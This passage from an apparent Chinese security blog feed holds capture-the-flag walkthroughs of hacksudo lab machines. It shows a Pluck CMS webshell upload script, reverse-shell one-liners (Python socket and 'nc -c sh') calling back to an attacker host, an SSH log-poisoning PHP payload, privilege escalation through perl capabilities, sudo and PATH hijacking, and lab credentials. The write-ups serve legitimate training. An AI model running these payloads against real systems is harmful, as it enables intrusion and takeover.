eShellContent = document.getElementById(\"shell-content\");\n                updateCwd();\n                eShellCmdInput.focus();\n            &#125;;\n        &lt;/script&gt;\n    &lt;/head&gt;\n\n    &lt;body&gt;\n        &lt;div id=\"shell\"&gt;\n            &lt;pre id=\"shell-content\"&gt;\n                &lt;div id=\"shell-logo\"&gt;\n        ___                         ____      _          _ _        _  _   &lt;span&gt;&lt;/span&gt;\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ &lt;span&gt;&lt;/span&gt;\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|&lt;span&gt;&lt;/span&gt;\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|&lt;span&gt;&lt;/span&gt;\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  &lt;span&gt;&lt;/span&gt;\n|_|                         |___/  \\____/                                  &lt;span&gt;&lt;/span&gt;\n                &lt;/div&gt;\n            &lt;/pre&gt;\n            &lt;div id=\"shell-input\"&gt;\n                &lt;label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\"&gt;???&lt;/label&gt;\n                &lt;div&gt;\n                    &lt;input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/&gt;\n                &lt;/div&gt;\n            &lt;/div&gt;\n        &lt;/div&gt;\n    &lt;/body&gt;\n\n&lt;/html&gt;\n\r\n-----------------------------5170699732428994785525662060\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\nUpload\r\n-----------------------------5170699732428994785525662060--\r\n"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Uploading Webshell:</span></span><br><span class="line">link_upload = <span class="string">'http://'</span> + target_ip + <span class="string">':'</span> + target_port + pluckcmspath + <span class="string">'/admin.php?action=files'</span></span><br><span class="line">upload = requests.post(link_upload, headers=header, data=data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Finish:</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">print(<span class="string">'Uploaded Webshell to: http://'</span> + target_ip + <span class="string">':'</span> + target_port + pluckcmspath + <span class="string">'/files/shell.phar'</span>)</span><br><span class="line">print(<span class="string">''</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 shell.py 192.168.1.170 80 hacktheplanet /</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">Authentification was succesfull, uploading webshell</span><br><span class="line"></span><br><span class="line">Uploaded Webshell to: http://192.168.1.170:80//files/shell.phar</span><br></pre></td></tr></table></figure>

<p><img data-src="./hacksudo-ProximaCentauri/10.png" alt></p>
<ul>
<li>反弹<code>shell</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.224",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'</span><br><span class="line"></span><br><span class="line">nc -lvnp 4242</span><br></pre></td></tr></table></figure>

<p><img data-src="./hacksudo-ProximaCentauri/11.png" alt></p>
<ul>
<li>发现敏感文件</li>
</ul>
<p><img data-src="./hacksudo-ProximaCentauri/12.png" alt></p>
<ul>
<li>获得数据库账号密码信息</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/** MySQL database username */</span><br><span class="line">define( 'DB_USER', 'alfauser' );</span><br><span class="line"></span><br><span class="line">/** MySQL database password */</span><br><span class="line">define( 'DB_PASSWORD', 'passw0rd' );</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh alfauser@192.168.1.170 passw0rd</span><br></pre></td></tr></table></figure>

<p>登录失败</p>
<ul>
<li>查找数据库</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -u alfauser -p </span><br><span class="line">passw0rd</span><br></pre></td></tr></table></figure>

<p><img data-src="./hacksudo-ProximaCentauri/13.png" alt></p>
<p>发现账号密码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">proxima / alfacentauri123</span><br></pre></td></tr></table></figure>

<ul>
<li><code>ssh</code></li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh proxima@192.168.1.170</span><br><span class="line">alfacentauri123</span><br></pre></td></tr></table></figure>

<h3 id="提权-amp-amp-flag"><a href="#提权-amp-amp-flag" class="headerlink" title="提权&amp;&amp;flag"></a>提权&amp;&amp;<code>flag</code></h3><ul>
<li><code>getcap</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">proxima@ProximaCentauri:~/proximaCentauriA$ getcap -r / 2&gt;/dev/null</span><br><span class="line">/home/proxima/proximaCentauriA/perl = cap_setuid+ep</span><br><span class="line">/usr/bin/ping = cap_net_raw+ep</span><br></pre></td></tr></table></figure>

<ul>
<li>利用<code>perl</code>提权</li>
</ul>
<p><a href="https://gtfobins.github.io/gtfobins/perl/" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/perl/</a></p>
<p><img data-src="./hacksudo-ProximaCentauri/14.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'</span><br></pre></td></tr></table></figure>

<p><img data-src="./hacksudo-ProximaCentauri/15.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>hacksudo</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>hacksudo</tag>
      </tags>
  </entry>
  <entry>
    <title>hacksudo-Thor</title>
    <url>/2021/10/01/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/hacksudo-Thor/</url>
    <content><![CDATA[<h1 id="hacksudo-Thor"><a href="#hacksudo-Thor" class="headerlink" title="hacksudo-Thor"></a>hacksudo-Thor</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>hacksudo-Thor</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:0e:9a:5b, IPv4: 192.168.1.224</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1	d8:c8:e9:fe:be:88	Phicomm (Shanghai) Co., Ltd.</span><br><span class="line">192.168.1.109	40:31:3c:22:9c:f3	XIAOMI Electronics,CO.,LTD</span><br><span class="line">192.168.1.111	38:d2:ca:db:01:69	Zhejiang Tmall Technology Co., Ltd.</span><br><span class="line">192.168.1.188	d0:c6:37:be:7e:b3	Intel Corporate</span><br><span class="line">192.168.1.189	b0:25:aa:2d:f5:9b	Private</span><br><span class="line">192.168.1.235	08:00:27:6e:dd:db	PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">6 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.002 seconds (127.87 hosts/sec). 6 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.1.235</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.1.235</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# nmap -sV -A -p 1-65535 192.168.1.235</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-13 08:16 EDT</span><br><span class="line">Nmap scan report for HacksudoThor.lan (192.168.1.235)</span><br><span class="line">Host is up (0.00048s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT   STATE    SERVICE VERSION</span><br><span class="line">21/tcp filtered ftp</span><br><span class="line">22/tcp open     ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 37:36:60:3e:26:ae:23:3f:e1:8b:5d:18:e7:a7:c7:ce (RSA)</span><br><span class="line">|   256 34:9a:57:60:7d:66:70:d5:b5:ff:47:96:e0:36:23:75 (ECDSA)</span><br><span class="line">|_  256 ae:7d:ee:fe:1d:bc:99:4d:54:45:3d:61:16:f8:6c:87 (ED25519)</span><br><span class="line">80/tcp open     http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn't have a title (text/html; charset=UTF-8).</span><br><span class="line">MAC Address: 08:00:27:6E:DD:DB (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 4.X|5.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">OS details: Linux 4.15 - 5.6</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.48 ms HacksudoThor.lan (192.168.1.235)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 10.79 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./hacksudo-Thor/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.235/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">┌──(root💀weiyi)-[/home/weiyi]</span><br><span class="line">└─# gobuster dir -u http://192.168.1.235/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.235/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/08/13 08:18:34 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/images               (Status: 301) [Size: 315] [--&gt; http://192.168.1.235/images/]</span><br><span class="line">/index.php            (Status: 200) [Size: 5357]                                  </span><br><span class="line">/contact.php          (Status: 200) [Size: 4164]                                  </span><br><span class="line">/home.php             (Status: 200) [Size: 5345]                                  </span><br><span class="line">/news.php             (Status: 200) [Size: 8062]                                  </span><br><span class="line">/header.php           (Status: 200) [Size: 472]                                   </span><br><span class="line">/connect.php          (Status: 200) [Size: 0]                                     </span><br><span class="line">/navbar.php           (Status: 200) [Size: 1515]                                  </span><br><span class="line">/fonts                (Status: 301) [Size: 314] [--&gt; http://192.168.1.235/fonts/] </span><br><span class="line">/transactions.php     (Status: 302) [Size: 8163] [--&gt; home.php]                   </span><br><span class="line">/server-status        (Status: 403) [Size: 278]                                   </span><br><span class="line">/customer_profile.php (Status: 302) [Size: 7274] [--&gt; home.php]                   </span><br><span class="line">                                                                                  </span><br><span class="line">===============================================================</span><br><span class="line">2021/08/13 08:20:27 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./hacksudo-Thor/2.png" alt></p>
<ul>
<li>网页源代码发现</li>
</ul>
<p><img data-src="./hacksudo-Thor/3.png" alt></p>
<ul>
<li>继续目录扫描</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.205/cgi-bin/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x sh</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root&gt; gobuster dir -u http://192.168.1.205/cgi-bin/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x sh</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.205/cgi-bin/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              sh</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/10/01 08:54:20 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/shell.sh             (Status: 500) [Size: 611]</span><br><span class="line">                                               </span><br><span class="line">===============================================================</span><br><span class="line">2021/10/01 08:55:42 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="shellshock"><a href="#shellshock" class="headerlink" title="shellshock"></a>shellshock</h3><ul>
<li>搜索漏洞<code>exp</code></li>
</ul>
<p><img data-src="./hacksudo-Thor/4.png" alt></p>
<ul>
<li><code>msf</code>拿到<code>shell</code></li>
</ul>
<p><img data-src="./hacksudo-Thor/5.png" alt></p>
<p><img data-src="./hacksudo-Thor/6.png" alt></p>
<h3 id="提权-amp-amp-Flag"><a href="#提权-amp-amp-Flag" class="headerlink" title="提权&amp;&amp;Flag"></a>提权&amp;&amp;Flag</h3><p><img data-src="./hacksudo-Thor/7.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -u thor /home/thor/./hammer.sh</span><br></pre></td></tr></table></figure>

<p><img data-src="./hacksudo-Thor/8.png" alt></p>
<ul>
<li>反弹<code>thor shell</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -c sh 192.168.1.102 9001</span><br></pre></td></tr></table></figure>

<p><img data-src="./hacksudo-Thor/9.png" alt></p>
<p><img data-src="./hacksudo-Thor/10.png" alt></p>
<p><img data-src="./hacksudo-Thor/11.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo service ../../bin/sh</span><br></pre></td></tr></table></figure>

<p><img data-src="./hacksudo-Thor/12.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>hacksudo</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>hacksudo</tag>
      </tags>
  </entry>
  <entry>
    <title>hacksudo-search</title>
    <url>/2021/04/25/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/hacksudo-search/</url>
    <content><![CDATA[<h1 id="hacksudo-search"><a href="#hacksudo-search" class="headerlink" title="hacksudo-search"></a>hacksudo-search</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>hacksudo-search</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:fa:35:f2, IPv4: 192.168.4.40</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.4.1     20:76:93:42:85:21       Lenovo (Beijing) Limited.</span><br><span class="line">192.168.4.2     00:15:17:2d:50:58       Intel Corporate</span><br><span class="line">192.168.4.3     20:0d:b0:31:ce:db       Shenzhen Four Seas Global Link Network Technology Co., Ltd.</span><br><span class="line">192.168.4.71    08:00:27:be:ad:c1       PCS Systemtechnik GmbH</span><br><span class="line">192.168.4.219   d0:c6:37:be:7e:b3       Intel Corporate</span><br><span class="line"></span><br><span class="line">5 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.964 seconds (130.35 hosts/sec). 5 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.4.71</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.4.71</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# nmap -sV -A -p 1-65535 192.168.4.71</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-25 02:57 EDT</span><br><span class="line">Nmap scan report for HacksudoSearch.lan (192.168.4.71)</span><br><span class="line">Host is up (0.0014s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 7b:44:7c:da:fb:e5:e6:1d:76:33:eb:fa:c0:dd:77:44 (RSA)</span><br><span class="line">|   256 13:2d:45:07:32:83:13:eb:4e:a1:20:f4:06:ba:26:8a (ECDSA)</span><br><span class="line">|_  256 21:a1:86:47:07:1b:df:b2:70:7e:d9:30:e3:29:c2:e7 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: HacksudoSearch</span><br><span class="line">MAC Address: 08:00:27:BE:AD:C1 (Oracle VirtualBox virtual NIC)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.80%E=4%D=4/25%OT=22%CT=1%CU=38019%PV=Y%DS=1%DC=D%G=Y%M=080027%T</span><br><span class="line">OS:M=608512F5%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%</span><br><span class="line">OS:TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5</span><br><span class="line">OS:=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=</span><br><span class="line">OS:FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%</span><br><span class="line">OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0</span><br><span class="line">OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S</span><br><span class="line">OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R</span><br><span class="line">OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N</span><br><span class="line">OS:%T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.35 ms HacksudoSearch.lan (192.168.4.71)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 20.36 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./hacksudo-search/1.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.4.71/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# gobuster dir -u http://192.168.4.71/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://192.168.4.71/</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Extensions:     html,txt,php</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/25 02:58:12 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/search.php (Status: 200)</span><br><span class="line">/index.php (Status: 200)</span><br><span class="line">/images (Status: 301)</span><br><span class="line">/submit.php (Status: 200)</span><br><span class="line">/assets (Status: 301)</span><br><span class="line">/account (Status: 301)</span><br><span class="line">/javascript (Status: 301)</span><br><span class="line">/robots.txt (Status: 200)</span><br><span class="line">/LICENSE (Status: 200)</span><br><span class="line">/search1.php (Status: 200)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/25 03:00:47 Finished</span><br><span class="line">===============================================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gobuster dir -u http://192.168.4.71/account -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# gobuster dir -u http://192.168.4.71/account -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:            http://192.168.4.71/account</span><br><span class="line">[+] Threads:        10</span><br><span class="line">[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster/3.0.1</span><br><span class="line">[+] Extensions:     html,txt,php</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/25 03:14:14 Starting gobuster</span><br><span class="line">===============================================================</span><br><span class="line">/assets (Status: 301)</span><br><span class="line">/logout.php (Status: 302)</span><br><span class="line">===============================================================</span><br><span class="line">2021/04/25 03:16:35 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./hacksudo-search/2.png" alt></p>
<h3 id="方向1"><a href="#方向1" class="headerlink" title="方向1"></a>方向1</h3><p><a href="http://192.168.4.71/account/" target="_blank" rel="noopener">http://192.168.4.71/account/</a></p>
<ul>
<li>发现源码泄露，审计未果</li>
</ul>
<p><img data-src="./hacksudo-search/3.png" alt></p>
<p><img data-src="./hacksudo-search/4.png" alt></p>
<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p><a href="http://192.168.4.71/search1.php?me=/etc/passwd" target="_blank" rel="noopener">http://192.168.4.71/search1.php?me=/etc/passwd</a></p>
<ul>
<li>这里文件包含需要将 <code>Me</code>改为<code>me</code>有点骚气 </li>
</ul>
<p><img data-src="./hacksudo-search/5.png" alt></p>
<ul>
<li>发现可包含<code>/var/log/auth.log</code></li>
</ul>
<p><img data-src="./hacksudo-search/6.png" alt></p>
<h3 id="SSH日志投毒"><a href="#SSH日志投毒" class="headerlink" title="SSH日志投毒"></a>SSH日志投毒</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh '&lt;?php system($_GET['c']);?&gt;'@192.168.4.71</span><br></pre></td></tr></table></figure>

<p><img data-src="./hacksudo-search/7.png" alt></p>
<ul>
<li>失败，无法拿到<code>webshell</code></li>
</ul>
<p><img data-src="./hacksudo-search/8.png" alt></p>
<h3 id="文件包含为远程文件包含"><a href="#文件包含为远程文件包含" class="headerlink" title="文件包含为远程文件包含"></a>文件包含为远程文件包含</h3><p><img data-src="./hacksudo-search/9.png" alt></p>
<p><img data-src="./hacksudo-search/10.png" alt></p>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p><img data-src="./hacksudo-search/11.png" alt></p>
<p><img data-src="./hacksudo-search/12.png" alt></p>
<h3 id="提权-amp-amp-Flag"><a href="#提权-amp-amp-Flag" class="headerlink" title="提权&amp;&amp;Flag"></a>提权&amp;&amp;Flag</h3><ul>
<li>访问 代码</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">define(<span class="string">'DBHOST'</span>, <span class="string">'localhost'</span>);</span><br><span class="line">define(<span class="string">'DBUSER'</span>, <span class="string">'hacksudo'</span>);</span><br><span class="line">define(<span class="string">'DBPASS'</span>, <span class="string">'p@ssword'</span>);</span><br><span class="line">define(<span class="string">'DBNAME'</span>, <span class="string">'wordpress'</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>数据库溜达一圈，无果</li>
</ul>
<p><img data-src="./hacksudo-search/13.png" alt></p>
<p>发现账号密码<code>hacksudo / MyD4dSuperH3r0!</code></p>
<p><img data-src="./hacksudo-search/14.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">PATH=/tmp:$PATH</span><br><span class="line">hacksudo@HacksudoSearch:/tmp$ mv bash install</span><br></pre></td></tr></table></figure>

<p><img data-src="./hacksudo-search/15.png" alt></p>
<p><img data-src="./hacksudo-search/16.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>hacksudo</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>hacksudo</tag>
      </tags>
  </entry>
  <entry>
    <title>hacksudo1</title>
    <url>/2021/04/20/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/hacksudo1/</url>
    <content><![CDATA[<h1 id="hacksudo1"><a href="#hacksudo1" class="headerlink" title="hacksudo1"></a>hacksudo1</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>hacksudo1</li>
<li>windows10</li>
</ul>
